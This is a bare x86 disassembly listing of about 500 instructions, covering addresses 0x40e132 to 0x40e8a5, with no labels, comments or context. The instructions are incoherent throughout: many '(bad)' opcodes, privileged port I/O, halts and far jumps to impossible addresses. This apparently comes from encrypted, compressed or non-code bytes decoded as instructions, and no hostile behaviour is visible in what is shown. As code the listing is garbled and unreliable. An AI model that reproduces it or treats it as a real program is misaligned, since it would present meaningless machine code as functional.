  40e132:	shl    ebp,1
  40e134:	(bad)
  40e139:	cwde   
  40e13a:	in     al,0xe9
  40e13c:	cli    
  40e13d:	pusha  
  40e13e:	sub    DWORD PTR ds:0xe04b8438,edx
  40e144:	mov    esp,0xa8f66d60
  40e149:	cmc    
  40e14a:	mov    ecx,DWORD PTR [ebx+0x32]
  40e14d:	int    0xa3
  40e14f:	ss xchg edi,eax
  40e151:	cmp    eax,0x51a99ac9
  40e156:	popa   
  40e157:	add    al,BYTE PTR [eax+ebx*1-0x18206396]
  40e15e:	xchg   al,dl
  40e160:	or     DWORD PTR [ebx-0x5c],ebx
  40e163:	jmp    0xc7712275
  40e168:	scas   eax,DWORD PTR es:[edi]
  40e169:	sub    cl,cl
  40e16b:	sbb    ebp,DWORD PTR [edi+0x7]
  40e16e:	push   esp
  40e16f:	push   ecx
  40e170:	add    BYTE PTR [esi*8-0x5027a2f4],al
  40e177:	aas    
  40e178:	pop    esi
  40e179:	xlat   BYTE PTR ds:[ebx]
  40e17a:	ds pushf 
  40e17c:	sahf   
  40e17d:	sar    BYTE PTR [eax],cl
  40e17f:	or     bh,BYTE PTR [ebx]
  40e181:	mov    bl,0x15
  40e183:	and    al,0x20
  40e185:	or     al,0x86
  40e187:	xor    edi,eax
  40e189:	aad    0xfa
  40e18b:	inc    ecx
  40e18c:	inc    ebx
  40e18d:	mov    ebp,0x8b1085a6
  40e192:	stos   DWORD PTR es:[edi],eax
  40e193:	mov    dh,0x47
  40e195:	sbb    eax,0x114c5536
  40e19a:	push   esi
  40e19c:	xor    al,0x66
  40e19e:	ins    DWORD PTR es:[edi],dx
  40e19f:	or     DWORD PTR [esi],edx
  40e1a1:	cdq    
  40e1a2:	jecxz  0x40e1dc
  40e1a4:	jb     0x40e14f
  40e1a6:	jp     0x40e199
  40e1a8:	int3   
  40e1a9:	std    
  40e1aa:	mov    ?,WORD PTR ds:0xfe3a421e
  40e1b0:	imul   ebp,DWORD PTR [eax+ebx*2+0x69],0xb0f461cf
  40e1b8:	or     cl,dh
  40e1ba:	lods   eax,DWORD PTR ds:[esi]
  40e1bb:	mov    eax,ds:0xd7743b5b
  40e1c0:	stos   DWORD PTR es:[edi],eax
  40e1c1:	inc    eax
  40e1c2:	ss pop ecx
  40e1c4:	in     eax,0x36
  40e1c6:	enter  0x3553,0x91
  40e1ca:	sahf   
  40e1cb:	push   ecx
  40e1cc:	jno    0x40e242
  40e1ce:	and    DWORD PTR [esi+0x39fbf5c3],edi
  40e1d4:	xor    ecx,DWORD PTR [ebp+0x2ccf15eb]
  40e1da:	add    edx,DWORD PTR [edi-0x1e]
  40e1dd:	enter  0x6d63,0x81
  40e1e1:	icebp  
  40e1e2:	jmp    0x40e1da
  40e1e4:	push   edx
  40e1e5:	lods   al,BYTE PTR ds:[esi]
  40e1e6:	(bad)  [edi-0x1e]
  40e1e9:	mov    bl,0x48
  40e1eb:	jnp    0x40e1a7
  40e1ed:	lds    edi,FWORD PTR [edi+0x27ca7177]
  40e1f3:	pop    edx
  40e1f4:	mov    dh,0x44
  40e1f6:	out    dx,al
  40e1f7:	jmp    0xe432f082
  40e1fc:	sar    BYTE PTR [ebx+0x1c],0x97
  40e200:	leave  
  40e201:	std    
  40e202:	call   0x1b19acc1
  40e207:	ror    DWORD PTR [ebp+0x27901e46],0xca
  40e20e:	or     DWORD PTR [ebx-0x4e],esp
  40e211:	or     esi,DWORD PTR [eax]
  40e213:	stos   DWORD PTR es:[edi],eax
  40e214:	in     eax,dx
  40e215:	sub    al,0x64
  40e217:	dec    esi
  40e218:	cmp    eax,0x849da6c0
  40e21d:	xor    BYTE PTR [ebp+0x37bf1c05],0x17
  40e224:	jno    0x40e289
  40e226:	pop    edx
  40e227:	mov    dh,0xef
  40e229:	cmp    dl,BYTE PTR [ecx+0x35]
  40e22c:	rcl    DWORD PTR [edi+eiz*1-0x1c7d6dde],1
  40e233:	mov    bl,0xa4
  40e235:	mov    esi,0xbdbf29d
  40e23a:	in     eax,0xf0
  40e23c:	inc    ebp
  40e23d:	mov    edx,0xdf8f3dcc
  40e242:	fcomp  QWORD PTR [edx-0x68a673b3]
  40e248:	xchg   ebp,eax
  40e249:	(bad)  
  40e24a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e24b:	mov    edi,0x520f5d01
  40e250:	cwde   
  40e251:	popf   
  40e252:	hlt    
  40e253:	addr16 in eax,0x5e
  40e256:	out    0x8e,al
  40e258:	cli    
  40e259:	pop    ds
  40e25a:	pop    ebp
  40e25b:	pop    ebx
  40e25c:	inc    ecx
  40e25d:	jo     0x40e1ee
  40e25f:	adc    edi,DWORD PTR [edx-0x31]
  40e262:	sbb    al,0x49
  40e264:	enter  0xa092,0x4e
  40e268:	sub    esi,esp
  40e26a:	mov    edx,0x95514be9
  40e26f:	ja     0x40e2c7
  40e271:	xchg   esp,eax
  40e272:	div    BYTE PTR [esi+0x646a9ede]
  40e278:	jg     0x40e258
  40e27a:	in     eax,dx
  40e27b:	or     eax,0xf82a3db8
  40e280:	or     DWORD PTR [ebp*4-0x828c521],ecx
  40e287:	test   BYTE PTR [edi],ah
  40e289:	push   ss
  40e28a:	push   edi
  40e28b:	stos   DWORD PTR es:[edi],eax
  40e28c:	xor    DWORD PTR [edi],ebx
  40e28e:	scas   eax,DWORD PTR es:[edi]
  40e28f:	xor    dh,BYTE PTR [edi+0x6f59f280]
  40e295:	mov    cl,0x3
  40e297:	mov    esi,0x70c01c83
  40e29c:	popa   
  40e29d:	psubsb mm1,QWORD PTR [eax-0x58]
  40e2a1:	call   DWORD PTR [esp+eax*1-0x7d]
  40e2a5:	fs push cs
  40e2a7:	pop    esi
  40e2a8:	mov    eax,0x3babee1
  40e2ad:	bound  eax,QWORD PTR [eax-0xe0683fa]
  40e2b3:	ds (bad) 
  40e2b5:	mov    ch,ch
  40e2b7:	jecxz  0x40e2f6
  40e2b9:	or     eax,0x8363446c
  40e2be:	lods   al,BYTE PTR ds:[esi]
  40e2bf:	rol    DWORD PTR [esi-0x6866d6d7],cl
  40e2c5:	repz mov ch,0x90
  40e2c8:	dec    eax
  40e2c9:	imul   esp,DWORD PTR [ebx],0x53
  40e2cc:	lea    esp,[ebx-0x4]
  40e2cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e2d0:	cmc    
  40e2d1:	mov    ah,0xe5
  40e2d3:	mov    dl,0x49
  40e2d5:	inc    ebp
  40e2d6:	out    dx,al
  40e2d7:	mov    ds:0x3627806d,eax
  40e2dc:	and    eax,0x43a049f9
  40e2e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e2e2:	xor    al,0x49
  40e2e4:	xchg   edi,eax
  40e2e5:	ret    0x62b1
  40e2e8:	jbe    0x40e292
  40e2ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e2eb:	test   bh,0x22
  40e2ee:	mov    ebx,0x56cf072f
  40e2f3:	mov    ecx,0x58074941
  40e2f8:	jl     0x40e366
  40e2fa:	jge    0x40e334
  40e2fc:	mov    ch,0x88
  40e2fe:	es cdq 
  40e300:	adc    ebp,eax
  40e302:	push   ecx
  40e303:	mov    ds:0x713e820d,eax
  40e308:	xchg   edi,eax
  40e309:	std    
  40e30a:	add    al,dl
  40e30c:	mov    dh,BYTE PTR [eiz*4+0x3bf23e16]
  40e313:	add    ebp,edx
  40e315:	push   eax
  40e316:	mov    al,0xa8
  40e318:	pusha  
  40e319:	hlt    
  40e31a:	jmp    0x7500:0xa63f2cdb
  40e321:	push   ecx
  40e322:	lahf   
  40e323:	and    DWORD PTR [edx-0x73],esp
  40e326:	push   esi
  40e327:	jmp    0x40e347
  40e329:	mov    al,0x8a
  40e32b:	xchg   ebp,eax
  40e32c:	xchg   edx,eax
  40e32d:	(bad)
  40e330:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e331:	sub    BYTE PTR [esi+0x379937bf],al
  40e337:	push   0x4e
  40e339:	in     al,0x3b
  40e33b:	adc    ch,al
  40e33d:	fstp   TBYTE PTR [ebx]
  40e33f:	jmp    0xbca4075
  40e344:	(bad)  
  40e345:	es in  eax,dx
  40e347:	pop    ebx
  40e348:	push   0xe88809b2
  40e34d:	sub    eax,0xa29a7064
  40e352:	std    
  40e353:	cld    
  40e354:	ins    BYTE PTR es:[edi],dx
  40e355:	test   al,0x9f
  40e357:	cli    
  40e358:	and    al,cl
  40e35a:	sbb    esp,esi
  40e35c:	je     0x40e355
  40e35e:	mov    BYTE PTR [ebp-0x52],bl
  40e361:	scas   eax,DWORD PTR es:[edi]
  40e362:	hlt    
  40e363:	hlt    
  40e364:	add    BYTE PTR [esi+0x38],cl
  40e367:	add    esp,ecx
  40e369:	dec    ebx
  40e36a:	mov    eax,ds:0xd67e896d
  40e36f:	add    DWORD PTR [esi],ebp
  40e371:	jg     0x40e3c1
  40e373:	sub    eax,0x3a2773d6
  40e378:	sub    DWORD PTR [ecx+edi*8],eax
  40e37b:	fidivr DWORD PTR [edx+0x5b7dcee1]
  40e381:	fstp   TBYTE PTR [eax+0x3b]
  40e384:	dec    esi
  40e385:	push   esi
  40e386:	(bad)  
  40e387:	mov    ebx,0xbe60a98b
  40e38c:	ss ins DWORD PTR es:[edi],dx
  40e38e:	(bad)  
  40e38f:	pop    ebx
  40e390:	inc    edi
  40e391:	add    BYTE PTR [eax-0x7235316a],bh
  40e397:	cmp    eax,0x3cf2b85b
  40e39c:	mov    al,0x35
  40e39e:	cwde   
  40e39f:	ror    cl,1
  40e3a1:	cmp    ebx,DWORD PTR [esi+0x711ff7b1]
  40e3a7:	dec    ecx
  40e3a8:	in     eax,dx
  40e3a9:	repnz mov edi,0x8638f425
  40e3af:	push   ecx
  40e3b0:	jmp    0xfa8e:0x49158f22
  40e3b7:	and    al,0x5e
  40e3b9:	dec    esp
  40e3ba:	stos   BYTE PTR es:[edi],al
  40e3bb:	add    eax,0xe3da2f88
  40e3c0:	inc    esi
  40e3c1:	in     eax,dx
  40e3c2:	sub    al,0xe9
  40e3c4:	mov    esi,DWORD PTR [ecx+edx*2]
  40e3c7:	jb     0x40e444
  40e3c9:	add    bl,BYTE PTR [edi+eax*4+0x4b73a73c]
  40e3d0:	pusha  
  40e3d1:	mov    BYTE PTR [ebx-0x669f33dc],0x72
  40e3d8:	and    DWORD PTR [edi+eax*8-0x3f],0xf19c3aeb
  40e3e0:	aam    0xf9
  40e3e2:	add    edi,DWORD PTR [eax]
  40e3e4:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  40e3e6:	jl     0x40e3d9
  40e3e8:	sar    BYTE PTR [esi-0x715577c8],1
  40e3ee:	push   ss
  40e3ef:	jle    0x40e3c2
  40e3f1:	mov    al,0x21
  40e3f3:	xchg   DWORD PTR [ecx],ebx
  40e3f5:	adc    esi,ebx
  40e3f7:	mov    eax,0x96013c74
  40e3fc:	mov    cl,0x35
  40e3fe:	bound  eax,QWORD PTR [esi-0x3ec9b7f5]
  40e404:	test   eax,0xb11bc87a
  40e409:	jb     0x40e42b
  40e40b:	(bad)  
  40e40c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e40d:	stos   DWORD PTR es:[edi],eax
  40e40e:	mov    bh,0x20
  40e410:	lds    edi,FWORD PTR [edi-0x2ffc5ed2]
  40e416:	or     al,0x46
  40e418:	data16 mov bl,0x89
  40e41b:	popa   
  40e41c:	xor    bh,BYTE PTR [edi+ecx*4+0x137ecbf5]
  40e423:	call   0xc4af0c8b
  40e428:	imul   esp,DWORD PTR [ecx-0x39],0xffffff97
  40e42c:	sbb    DWORD PTR [edi-0x5],esp
  40e42f:	pop    edx
  40e430:	push   0xc00a1f3a
  40e435:	pop    ebx
  40e436:	rol    BYTE PTR [edi+0x28],cl
  40e439:	mov    ah,dl
  40e43b:	jns    0x40e3c5
  40e43d:	sahf   
  40e43e:	cwde   
  40e43f:	add    ecx,edi
  40e441:	aaa    
  40e442:	xchg   ebx,eax
  40e443:	dec    edi
  40e444:	test   dl,dh
  40e446:	in     eax,dx
  40e447:	aad    0xce
  40e449:	icebp  
  40e44a:	stos   BYTE PTR es:[edi],al
  40e44b:	jl     0x40e3e7
  40e44d:	outs   dx,DWORD PTR ds:[esi]
  40e44e:	in     eax,0x32
  40e450:	pop    ebp
  40e451:	daa    
  40e452:	xor    cl,BYTE PTR [ecx+0x6708a962]
  40e458:	mov    ebx,0x47e94c25
  40e45d:	xchg   ecx,eax
  40e45e:	pop    esp
  40e45f:	inc    ecx
  40e460:	mov    esi,0x36edd42
  40e465:	ja     0x40e40a
  40e467:	shr    DWORD PTR [ecx+ecx*1+0x37850259],1
  40e46e:	adc    al,0x23
  40e470:	mov    eax,0xb648fb22
  40e475:	push   eax
  40e476:	sbb    BYTE PTR [edi-0x53],cl
  40e479:	mov    dh,0x75
  40e47b:	mov    esp,0xcff36c7b
  40e480:	test   al,0x27
  40e482:	jae    0x40e4b4
  40e484:	add    al,0x54
  40e486:	leave  
  40e487:	ret    0x34ad
  40e48a:	leave  
  40e48b:	or     bl,BYTE PTR [ebp+0x16]
  40e48e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e48f:	stos   DWORD PTR es:[edi],eax
  40e490:	ss iret 
  40e492:	test   BYTE PTR [edx],0x3b
  40e495:	cld    
  40e496:	xor    BYTE PTR [edx-0x78fcf540],ah
  40e49c:	std    
  40e49d:	xchg   ebx,eax
  40e49e:	xlat   BYTE PTR ds:[ebx]
  40e49f:	push   es
  40e4a0:	jmp    0x40e4d2
  40e4a2:	push   ebp
  40e4a3:	mov    edi,0x38fb7e98
  40e4a8:	xor    bh,BYTE PTR [edx+0x5fdf9cbc]
  40e4ae:	mov    ecx,0x65008d01
  40e4b3:	cmp    esi,0x56
  40e4b6:	pop    ss
  40e4b7:	stos   BYTE PTR es:[edi],al
  40e4b8:	mov    WORD PTR cs:[ecx+0x1e47d7df],ds
  40e4bf:	loope  0x40e510
  40e4c1:	push   ebp
  40e4c2:	add    esi,DWORD PTR [eax-0x444b65c0]
  40e4c8:	call   0x7849:0x20a80b18
  40e4cf:	dec    ebx
  40e4d0:	lods   al,BYTE PTR ds:[esi]
  40e4d1:	popf   
  40e4d2:	popf   
  40e4d3:	or     al,0xe8
  40e4d5:	fxch   st(1)
  40e4d7:	mov    dl,0x6
  40e4d9:	lods   eax,DWORD PTR ds:[esi]
  40e4da:	(bad)  
  40e4dc:	jecxz  0x40e532
  40e4de:	push   ebp
  40e4df:	out    dx,al
  40e4e0:	adc    BYTE PTR [esi+0x6c],dl
  40e4e3:	in     eax,0xc8
  40e4e5:	(bad)  
  40e4e6:	cld    
  40e4e7:	mov    dh,0x93
  40e4e9:	inc    edx
  40e4ea:	mov    DWORD PTR [ecx],ecx
  40e4ec:	inc    edx
  40e4ed:	dec    esp
  40e4ee:	into   
  40e4ef:	es in  eax,0xcb
  40e4f2:	adc    ecx,esp
  40e4f4:	cwde   
  40e4f5:	or     DWORD PTR [ebx+0x4d],edi
  40e4f8:	push   ss
  40e4f9:	pop    edi
  40e4fa:	imul   ebx,DWORD PTR [esi+0x45],0x9ef3aa0e
  40e501:	cmp    al,0x60
  40e503:	ss mov ch,0xed
  40e506:	jmp    edi
  40e508:	jl     0x40e56c
  40e50a:	dec    ecx
  40e50b:	out    0x1a,al
  40e50d:	dec    esi
  40e50e:	fisttp WORD PTR [ecx]
  40e510:	pop    es
  40e511:	jbe    0x40e545
  40e513:	cdq    
  40e514:	inc    bh
  40e516:	cmp    DWORD PTR [ebx],esi
  40e518:	cmp    ebp,DWORD PTR [esi+0x362de4c8]
  40e51e:	test   al,0x3
  40e520:	and    DWORD PTR [ecx+ebx*1],ecx
  40e523:	mov    esp,0x4a385298
  40e528:	cwde   
  40e529:	imul   edx,DWORD PTR [esi+0x0],0xffffffa9
  40e52d:	(bad)  
  40e52e:	(bad)  
  40e52f:	jge    0x40e50c
  40e531:	xchg   ebx,eax
  40e532:	fild   QWORD PTR [esi]
  40e534:	jle    0x40e525
  40e536:	sub    al,0x76
  40e538:	or     ch,dl
  40e53a:	push   0xbf58f7bc
  40e53f:	loopne 0x40e4d9
  40e541:	mov    ecx,0x66da1df0
  40e546:	and    BYTE PTR es:[ecx+0x4c210e54],al
  40e54d:	or     BYTE PTR [esi+edi*4],dh
  40e550:	fisubr DWORD PTR [ecx]
  40e552:	adc    ch,cl
  40e554:	dec    eax
  40e555:	inc    esi
  40e556:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e557:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e558:	inc    esi
  40e559:	xor    al,0x8a
  40e55b:	xor    dh,bl
  40e55d:	sbb    BYTE PTR [ebp-0x468ff1a],0x68
  40e564:	sahf   
  40e565:	sub    dh,cl
  40e567:	fst    QWORD PTR [ecx-0xa]
  40e56a:	ret    
  40e56b:	cmp    eax,0x13f90a5f
  40e570:	popf   
  40e571:	xor    BYTE PTR [edi-0x983c6b],0x34
  40e578:	jmp    0x2bab:0x9b9a0cbf
  40e57f:	pop    eax
  40e580:	or     al,0x5e
  40e582:	les    ecx,FWORD PTR [esi]
  40e584:	ffree  st(2)
  40e586:	push   edx
  40e587:	mov    esp,0x2c6c5cb6
  40e58c:	jo     0x40e5ea
  40e58e:	jmp    0x6dc32e08
  40e593:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e594:	out    0xa6,al
  40e596:	fadd   DWORD PTR [edi+eax*8]
  40e599:	mov    edi,0xed85a1a9
  40e59e:	xor    al,0x13
  40e5a0:	std    
  40e5a1:	loop   0x40e552
  40e5a3:	add    al,BYTE PTR [esi-0x1]
  40e5a6:	repnz xor eax,0x1adba0ae
  40e5ac:	adc    BYTE PTR [ebx+esi*2-0x2354a64d],dh
  40e5b3:	mov    al,ds:0x580fa31
  40e5b8:	mov    bh,0x1c
  40e5ba:	inc    ebp
  40e5bb:	out    0x8c,al
  40e5bd:	inc    ecx
  40e5be:	mov    eax,DWORD PTR [esi-0x1b]
  40e5c1:	loop   0x40e612
  40e5c3:	leave  
  40e5c4:	icebp  
  40e5c5:	lods   al,BYTE PTR ds:[esi]
  40e5c6:	sub    eax,0xed516137
  40e5cb:	enter  0xea59,0xc
  40e5cf:	das    
  40e5d0:	cmp    ebx,edi
  40e5d2:	hlt    
  40e5d3:	dec    esp
  40e5d4:	add    cl,BYTE PTR [ecx]
  40e5d6:	lods   eax,DWORD PTR es:[esi]
  40e5d8:	cmp    bl,al
  40e5da:	dec    ebx
  40e5db:	xchg   ecx,eax
  40e5dc:	iret   
  40e5dd:	mov    ah,0x21
  40e5df:	mov    ah,0x40
  40e5e1:	jo     0x40e5e6
  40e5e3:	push   ebx
  40e5e4:	mov    al,ds:0x191b5281
  40e5e9:	cwde   
  40e5ea:	mov    esp,0xe43dfda
  40e5ef:	js     0x40e5b9
  40e5f1:	and    eax,0x42b9b803
  40e5f6:	cld    
  40e5f7:	or     BYTE PTR [edi],bl
  40e5f9:	and    DWORD PTR [edi+ebp*1-0x4f],edx
  40e5fd:	pop    esi
  40e5fe:	mov    ch,0x5c
  40e600:	mov    eax,ds:0x87448220
  40e605:	mov    ebx,0x4e4dbf5c
  40e60a:	sahf   
  40e60b:	(bad)  
  40e60c:	jge    0x40e664
  40e60e:	push   ebx
  40e60f:	mov    edi,0x29e17f8
  40e614:	or     al,0xaf
  40e616:	dec    edx
  40e617:	cmp    BYTE PTR [edi+ecx*2-0x22],ah
  40e61b:	and    dh,dl
  40e61d:	pop    ds
  40e61e:	add    eax,0x16102a24
  40e623:	xchg   esi,eax
  40e624:	mov    ?,ebx
  40e626:	enter  0xc114,0xce
  40e62a:	push   edi
  40e62b:	daa    
  40e62c:	adc    al,0xfd
  40e62e:	mov    BYTE PTR [ebx],bl
  40e630:	or     eax,0x27f89439
  40e635:	mov    al,0xe3
  40e637:	leave  
  40e638:	or     al,0xf0
  40e63a:	std    
  40e63b:	inc    edx
  40e63c:	sub    BYTE PTR [ebx+0x32dd0398],cl
  40e642:	inc    ecx
  40e643:	cmp    edi,ecx
  40e645:	sbb    al,0x97
  40e647:	push   es
  40e648:	ja     0x40e5e0
  40e64a:	sti    
  40e64b:	xor    bl,dh
  40e64d:	mov    bl,0x25
  40e64f:	(bad)  
  40e650:	jecxz  0x40e6b1
  40e652:	cmc    
  40e653:	xor    BYTE PTR ds:0xbca497e2,ah
  40e659:	stos   BYTE PTR es:[edi],al
  40e65a:	out    dx,eax
  40e65b:	ss mov eax,0xbb93543e
  40e661:	aam    0xca
  40e663:	xchg   ebx,eax
  40e664:	mov    ecx,0x1e00d906
  40e669:	adc    BYTE PTR [eax+0x6c],bh
  40e66c:	test   DWORD PTR [esi+0x607dcbcb],edx
  40e672:	adc    BYTE PTR [edx+0x5],0xef
  40e676:	shl    BYTE PTR [edx-0x64b422bf],0x7e
  40e67d:	xchg   edi,eax
  40e67e:	aam    0x77
  40e680:	pop    esp
  40e681:	mov    bh,BYTE PTR [esi-0x4c]
  40e684:	cli    
  40e685:	clc    
  40e686:	sub    ch,BYTE PTR [ebp+0x155e0f4a]
  40e68c:	inc    ebx
  40e68d:	outs   dx,DWORD PTR ds:[esi]
  40e68e:	mov    al,ds:0x8007dd9f
  40e693:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e694:	add    BYTE PTR [edx],0x46
  40e697:	cmp    BYTE PTR [ebx-0x6d88c84d],al
  40e69d:	mov    al,ds:0x626e47bb
  40e6a2:	xchg   ebp,eax
  40e6a3:	in     al,0x3b
  40e6a5:	xchg   esi,eax
  40e6a6:	clc    
  40e6a7:	(bad)  
  40e6a8:	push   eax
  40e6a9:	xor    dl,al
  40e6ab:	shl    DWORD PTR [ecx-0x65],0xdc
  40e6af:	inc    eax
  40e6b0:	addr16 jne 0x40e6ea
  40e6b3:	ret    
  40e6b4:	les    eax,FWORD PTR [eax+0xc769029]
  40e6ba:	or     BYTE PTR [esi],cl
  40e6bc:	rcr    ah,1
  40e6be:	xchg   ebx,eax
  40e6bf:	jmp    0x1550be76
  40e6c4:	push   ds
  40e6c5:	fisub  DWORD PTR [esi-0x1b85921a]
  40e6cb:	iret   
  40e6cc:	in     al,dx
  40e6cd:	les    edi,FWORD PTR [edi-0x5e15504a]
  40e6d3:	jns    0x40e66b
  40e6d5:	nop
  40e6d6:	sub    ecx,DWORD PTR [edx+0xc]
  40e6d9:	stos   BYTE PTR es:[edi],al
  40e6da:	gs pop edi
  40e6dc:	ficomp DWORD PTR ds:0xf9084b7d
  40e6e2:	push   edi
  40e6e3:	out    dx,eax
  40e6e4:	xor    BYTE PTR [ecx+0x212be818],al
  40e6ea:	xchg   esi,eax
  40e6eb:	cmp    BYTE PTR [esi],al
  40e6ed:	and    al,0x30
  40e6ef:	scas   eax,DWORD PTR es:[edi]
  40e6f0:	or     bh,BYTE PTR [ebx+ecx*4]
  40e6f3:	out    0x2d,al
  40e6f5:	inc    BYTE PTR [esi-0x458b2631]
  40e6fb:	ja     0x40e702
  40e6fd:	sub    dl,bl
  40e6ff:	pop    ebp
  40e700:	retf   
  40e701:	mov    dl,BYTE PTR [edx]
  40e703:	imul   ebp,DWORD PTR [ecx+0x13338ab9],0xdd3fc916
  40e70d:	out    dx,al
  40e70e:	mov    dh,0x6b
  40e710:	xor    eax,ebx
  40e712:	jo     0x40e765
  40e714:	(bad)  
  40e715:	xor    BYTE PTR [ebp+0x3f],dl
  40e718:	bound  edi,QWORD PTR [ecx-0x52d06852]
  40e71e:	push   esi
  40e71f:	pop    edx
  40e720:	mov    ebx,DWORD PTR [edi+0x57]
  40e723:	mov    edi,DWORD PTR ds:0x539567cc
  40e729:	jle    0x40e72f
  40e72b:	jmp    0x40e6ba
  40e72d:	push   ebx
  40e72e:	add    dh,BYTE PTR [ebp-0x8fe1bf8]
  40e734:	sar    bl,0xbe
  40e737:	jnp    0x40e6e8
  40e739:	fadd   st(4),st
  40e73b:	aas    
  40e73c:	shr    DWORD PTR [eax],0x46
  40e73f:	retf   
  40e740:	add    ebp,DWORD PTR [eax+edx*1]
  40e743:	hlt    
  40e744:	push   edi
  40e745:	lahf   
  40e746:	scas   eax,DWORD PTR es:[edi]
  40e747:	inc    edx
  40e748:	push   edx
  40e749:	jns    0x40e6d2
  40e74b:	push   eax
  40e74c:	sbb    BYTE PTR [ecx+0x1a],ch
  40e74f:	leave  
  40e750:	sub    esi,DWORD PTR [edi+ebx*4]
  40e753:	push   es
  40e754:	sbb    eax,0x1671a864
  40e759:	sub    DWORD PTR [edx+0x75581dd0],ecx
  40e75f:	lods   eax,DWORD PTR ds:[esi]
  40e760:	add    DWORD PTR [edx],0x6f
  40e763:	xchg   ebx,eax
  40e764:	dec    DWORD PTR [edx]
  40e766:	nop
  40e767:	or     cl,BYTE PTR [ecx+0x2ac415f9]
  40e76d:	push   eax
  40e76e:	push   0x88d8aab6
  40e773:	test   al,0xf2
  40e775:	pop    ds
  40e776:	lea    ecx,[ebp+0x6e]
  40e779:	sub    ch,BYTE PTR [ecx-0x6a5d5ddf]
  40e77f:	into   
  40e780:	and    eax,0xc5b5c4cd
  40e785:	pop    eax
  40e786:	fidiv  WORD PTR [edi]
  40e788:	in     eax,dx
  40e789:	shl    bl,cl
  40e78b:	and    eax,0xa32023c2
  40e790:	xchg   esp,eax
  40e791:	sbb    eax,DWORD PTR [esi]
  40e793:	pushf  
  40e794:	leave  
  40e795:	and    DWORD PTR [edi-0xaed9fbb],eax
  40e79b:	(bad)  
  40e79c:	or     eax,0x7c43c602
  40e7a1:	xor    ebx,ebp
  40e7a3:	imul   esi,DWORD PTR ds:0xf2358e61,0x5d168d6b
  40e7ad:	pop    ebp
  40e7ae:	(bad)  
  40e7af:	mov    edx,0x3d38d6c1
  40e7b4:	push   0x62ca56bc
  40e7b9:	cmp    ah,cl
  40e7bb:	out    0xe3,eax
  40e7bd:	pop    ds
  40e7be:	test   al,0x75
  40e7c0:	cmp    eax,0x2644300a
  40e7c5:	cli    
  40e7c6:	push   esi
  40e7c7:	(bad)  
  40e7c9:	test   DWORD PTR [ebx+0x3654080d],ebp
  40e7cf:	es retf 
  40e7d1:	(bad)  
  40e7d2:	push   ds
  40e7d3:	sub    al,0x23
  40e7d5:	and    al,0x2e
  40e7d7:	(bad)
  40e7db:	outs   dx,BYTE PTR ds:[esi]
  40e7dc:	lods   al,BYTE PTR ds:[esi]
  40e7dd:	aas    
  40e7de:	aaa    
  40e7df:	push   edx
  40e7e0:	xchg   edi,eax
  40e7e1:	in     eax,dx
  40e7e2:	test   ecx,ebx
  40e7e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e7e5:	dec    edx
  40e7e6:	sahf   
  40e7e7:	push   ebp
  40e7e8:	rcl    BYTE PTR [edi+0x5c0c6a70],0x2d
  40e7ef:	retf   
  40e7f0:	das    
  40e7f1:	pop    ecx
  40e7f2:	adc    esp,DWORD PTR [ebp+ebp*1+0x675b54c1]
  40e7f9:	xchg   ecx,eax
  40e7fa:	jecxz  0x40e7b6
  40e7fc:	loop   0x40e810
  40e7fe:	pusha  
  40e7ff:	push   edi
  40e800:	jns    0x40e7ad
  40e802:	and    ecx,0xffffffeb
  40e805:	test   al,0xfb
  40e807:	ror    BYTE PTR [ebp+esi*2-0x15],cl
  40e80b:	mov    dl,0xd1
  40e80d:	jbe    0x40e835
  40e80f:	mov    bl,0xed
  40e811:	cmp    edx,DWORD PTR [edx-0x5fff79ca]
  40e817:	or     bh,BYTE PTR [ebp+0x3d]
  40e81a:	cmp    eax,0xee16faf6
  40e81f:	dec    edi
  40e820:	cdq    
  40e821:	jge    0x40e7a5
  40e823:	xchg   ebp,eax
  40e824:	inc    ebx
  40e825:	pop    ecx
  40e826:	and    ch,BYTE PTR [esi-0xa]
  40e829:	sub    DWORD PTR [edi],ebx
  40e82b:	mov    eax,ds:0x97f0ce1c
  40e830:	sti    
  40e831:	jmp    0xb027ddf6
  40e836:	test   eax,ebp
  40e838:	jmp    0x48e9:0xa9744ef2
  40e83f:	repnz out 0x9c,eax
  40e842:	stos   DWORD PTR es:[edi],eax
  40e843:	pop    ds
  40e844:	dec    eax
  40e845:	test   eax,0x862fa857
  40e84a:	sbb    ch,dh
  40e84c:	sub    DWORD PTR [ecx+edx*2],esi
  40e84f:	adc    ebp,DWORD PTR [edi]
  40e851:	pmulhuw mm6,QWORD PTR [eax+0x4631079c]
  40e858:	jp     0x40e848
  40e85a:	mov    BYTE PTR [edx-0x2c],ah
  40e85d:	fs adc al,0xf5
  40e860:	xor    ebx,esp
  40e862:	outs   dx,DWORD PTR ds:[esi]
  40e863:	ja     0x40e84c
  40e865:	fucomp st(5)
  40e867:	repz sub eax,esi
  40e86a:	sub    DWORD PTR [ecx-0x42a4866e],esi
  40e870:	pusha  
  40e871:	sbb    al,0x4
  40e873:	repnz imul edx,DWORD PTR [edi+0x4a161bce],0xffffffa7
  40e87b:	lods   al,BYTE PTR ds:[esi]
  40e87c:	mov    al,0x85
  40e87e:	jns    0x40e8a8
  40e880:	cmp    DWORD PTR ds:0xc89f9718,eax
  40e886:	xor    cl,BYTE PTR [edi]
  40e888:	mov    esp,0xabcab9c7
  40e88d:	clc    
  40e88e:	mov    DWORD PTR [edx],ebp
  40e890:	jno    0x40e8d0
  40e892:	outs   dx,DWORD PTR ds:[esi]
  40e893:	pop    es
  40e894:	lods   al,BYTE PTR ds:[esi]
  40e895:	add    ah,dl
  40e897:	cmp    al,0x71
  40e89a:	inc    eax
  40e89b:	mov    dl,0xcd
  40e89d:	sti    
  40e89e:	add    ah,BYTE PTR [edx+eiz*1]
  40e8a1:	inc    esp
  40e8a2:	out    0x6b,al
  40e8a4:	inc    ebp
